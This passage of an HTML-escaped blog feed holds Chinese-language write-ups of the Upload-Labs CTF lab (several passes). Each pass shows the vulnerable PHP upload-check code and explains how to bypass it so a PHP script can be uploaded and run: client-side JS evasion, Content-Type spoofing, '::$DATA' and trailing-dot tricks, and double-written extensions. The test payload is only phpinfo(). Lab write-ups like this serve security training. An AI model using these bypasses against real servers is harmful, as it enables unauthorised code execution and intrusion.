#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;,&amp;#34;.ini&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = trim($file_ext); //首尾去空
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#34;YmdHis&amp;#34;).rand(1000,9999).$file_ext;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 审查代码发现少了对&lt;code&gt;::$DATA&lt;/code&gt;字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php在window的时候如果文件名+&amp;quot;::$DATA&amp;quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&amp;quot;::$DATA&amp;quot;之前的文件名&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 直接上传的时候抓包在文件名后面添加&lt;code&gt;::$DATA&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbP84P.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 上传访问。完工&lt;/p&gt;
&lt;h2 id="pass-09"&gt;Pass-09
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过&lt;code&gt;strrchr()&lt;/code&gt;函数截取后缀名转换小写。&lt;/p&gt;
&lt;p&gt;​ 所以和第七题一样构造&lt;strong&gt;2333.php. .&lt;/strong&gt;(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点&amp;quot;.&amp;quot;，铁定不在黑名单后缀里，实现绕过后缀检查。&lt;/p&gt;
&lt;p&gt;​ 但是这道题&lt;strong&gt;只能使用windows环境&lt;/strong&gt;，因为执行了&lt;code&gt;deldot()&lt;/code&gt;函数删除了最后一个点之后，文件名成了&lt;code&gt;2333.php.&lt;/code&gt;，而linux环境下因为不会自动删除最后一个点而不能访问成功。&lt;/p&gt;
&lt;p&gt;​ 图前面有了就不贴了。&lt;/p&gt;
&lt;h2 id="pass-10"&gt;Pass-10
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;php&amp;#34;,&amp;#34;php5&amp;#34;,&amp;#34;php4&amp;#34;,&amp;#34;php3&amp;#34;,&amp;#34;php2&amp;#34;,&amp;#34;html&amp;#34;,&amp;#34;htm&amp;#34;,&amp;#34;phtml&amp;#34;,&amp;#34;pht&amp;#34;,&amp;#34;jsp&amp;#34;,&amp;#34;jspa&amp;#34;,&amp;#34;jspx&amp;#34;,&amp;#34;jsw&amp;#34;,&amp;#34;jsv&amp;#34;,&amp;#34;jspf&amp;#34;,&amp;#34;jtml&amp;#34;,&amp;#34;asp&amp;#34;,&amp;#34;aspx&amp;#34;,&amp;#34;asa&amp;#34;,&amp;#34;asax&amp;#34;,&amp;#34;ascx&amp;#34;,&amp;#34;ashx&amp;#34;,&amp;#34;asmx&amp;#34;,&amp;#34;cer&amp;#34;,&amp;#34;swf&amp;#34;,&amp;#34;htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = str_ireplace($deny_ext,&amp;#34;&amp;#34;, $file_name);
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;上传出错！&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 这道题和前面不同的是&lt;code&gt;$file_name = str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name)&lt;/code&gt;，对于这个函数：&lt;code&gt;str_ireplace(find,replace,string,count)&lt;/code&gt;，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名&lt;code&gt;2333.pphphp&lt;/code&gt;，只有一个&amp;quot;php&amp;quot;字符串被匹配到并被替换成空串，剩下的文件名就成了&lt;code&gt;2333.php&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb8yPf.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;上传并访问文件。完工&lt;/p&gt;</description></item><item><title>Upload-Labs(一)</title><link>https://www.braindance.top/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="介绍"&gt;介绍
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在线靶机地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#Upload-Labs-Linux" target="_blank" rel="noopener"
&gt;linux环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows" target="_blank" rel="noopener"
&gt;windows环境&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-01"&gt;Pass-01
&lt;/h2&gt;&lt;p&gt;​ 尝试上传php木马，发现提示上传错误&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 提示只能上传&lt;code&gt;jpg、png、gif&lt;/code&gt;类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&lt;/p&gt;
&lt;p&gt;​ 源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkFile&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementsByName&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;].&lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//定义允许上传的文件类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//提取上传文件的类型
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;substring&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;lastIndexOf&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//判断上传文件类型是否允许上传
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;indexOf&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;|&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 把文件后缀名改成jpg格式上传，使用&lt;strong&gt;burp suit&lt;/strong&gt;抓包。把&lt;code&gt;.jpg&lt;/code&gt;后缀重新改为&lt;code&gt;.php&lt;/code&gt;即可实现绕过前端JS代码。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 然后右键打开图片，代码成功执行。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 注：后面题目的php代码都使用&lt;code&gt;2333.php&lt;/code&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;phpinfo&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 执行结果是打印出php版本信息。&lt;/p&gt;
&lt;h2 id="pass-02"&gt;Pass-02
&lt;/h2&gt;&lt;p&gt;​ 源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; ($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; ($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/gif&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;文件类型不正确，请重新上传！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 发现文件判断是根据&lt;code&gt;image/jpeg、image/png...&lt;/code&gt;进行过滤判定，这些值都是Http请求中的&lt;strong&gt;Content-Type&lt;/strong&gt;常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:&lt;a class="link" href="https://www.cnblogs.com/klb561/p/10090540.html" target="_blank" rel="noopener"
&gt;Http请求中Content-Type&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;​ 同样是burp抓包修改&lt;strong&gt;Content-Type&lt;/strong&gt;的值。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BT1EXq.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 打开图片，php代码成功执行。完工&lt;/p&gt;
&lt;h2 id="pass-03"&gt;Pass-03
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;.asp&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.aspx&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.jsp&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//删除文件名末尾的点
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//转换为小写
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//去除字符串::$DATA
